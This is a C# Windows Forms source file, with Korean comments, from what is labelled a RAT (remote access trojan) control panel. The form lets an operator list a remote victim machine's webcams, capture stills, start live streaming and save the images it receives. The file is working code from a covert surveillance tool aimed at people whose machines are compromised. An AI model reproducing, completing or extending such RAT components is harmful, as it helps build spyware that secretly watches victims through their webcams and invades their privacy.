using System;
using System.Drawing;
using System.Windows.Forms;
using System.Threading.Tasks;
using Newtonsoft.Json;
using RAT.Shared.Models;

namespace RAT.ControlPanel.Forms
{
    public partial class frmWebcam : Form
    {
        private ClientInfo client;
        private MainForm mainForm;
        private bool isStreaming = false;
        private int selectedDevice = 0;
        
        public frmWebcam(ClientInfo client, MainForm mainForm)
        {
            this.client = client;
            this.mainForm = mainForm;
            InitializeComponent();
            this.Text = $"Webcam - {client.ClientId}";
            
            // MainForm에 이 폼 등록
            mainForm.RegisterForm(client.ClientId, this);
        }
        
        private async void frmWebcam_Load(object sender, EventArgs e)
        {
            // 웹캠 목록 가져오기
            await SendCommand(new { type = "webcam_list" });
        }
        
        // ===== Capture =====
        
        private async void btnCapture_Click(object sender, EventArgs e)
        {
            await SendCommand(new { type = "webcam_capture", device = selectedDevice });
        }
        
        // ===== Start/Stop Streaming =====
        
        private async void btnStart_Click(object sender, EventArgs e)
        {
            if (!isStreaming)
            {
                await SendCommand(new { type = "webcam_stream", action = "start", device = selectedDevice });
                isStreaming = true;
                btnStart.Text = "Stop";
                btnStart.BackColor = Color.Red;
            }
            else
            {
                await SendCommand(new { type = "webcam_stream", action = "stop" });
                isStreaming = false;
                btnStart.Text = "Start";
                btnStart.BackColor = SystemColors.Control;
            }
        }
        
        // ===== Device Selection =====
        
        private void comboBoxDevices_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (comboBoxDevices.SelectedIndex >= 0)
            {
                selectedDevice = comboBoxDevices.SelectedIndex;
                
                if (isStreaming)
                {
                    // 스트리밍 중이면 재시작
                    _ = SendCommand(new { type = "webcam_stream", action = "stop" });
                    _ = SendCommand(new { type = "webcam_stream", action = "start", device = selectedDevice });
                }
            }
        }
        
        // ===== Save Image =====
        
        private void btnSave_Click(object sender, EventArgs e)
        {
            if (pictureBox1.Image == null)
            {
                MessageBox.Show("No image to save", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }
            
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "PNG Image|*.png|JPEG Image|*.jpg|Bitmap Image|*.bmp";
            sfd.FileName = $"webcam_{DateTime.Now:yyyyMMdd_HHmmss}";
            
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                pictureBox1.Image.Save(sfd.FileName);
                MessageBox.Show("Image saved successfully", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        
        // ===== 명령 전송 =====
        
        private async Task SendCommand(object command)
        {
            await mainForm.SendCommand(client, command);
        }
        
        // ===== 응답 처리 =====
        
        public void HandleResponse(dynamic response)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => HandleResponse(response)));
                return;
            }
            
            string type = response.type.ToString();
            
            if (type == "webcam_list")
            {
                comboBoxDevices.Items.Clear();
                foreach (var device in response.data)
                {
                    comboBoxDevices.Items.Add(device.ToString());
                }
                
                if (comboBoxDevices.Items.Count > 0)
                {
                    comboBoxDevices.SelectedIndex = 0;
                }
            }
            else if (type == "webcam_capture" || type == "webcam_stream")
            {
                string base64Image = response.data.ToString();
                byte[] imageBytes = Convert.FromBase64String(base64Image);
                
                using (var ms = new System.IO.MemoryStream(imageBytes))
                {
                    pictureBox1.Image = Image.FromStream(ms);
                }
            }
        }
        
        private void frmWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (isStreaming)
            {
                _ = SendCommand(new { type = "webcam_stream", action = "stop" });
            }
        }
    }
}
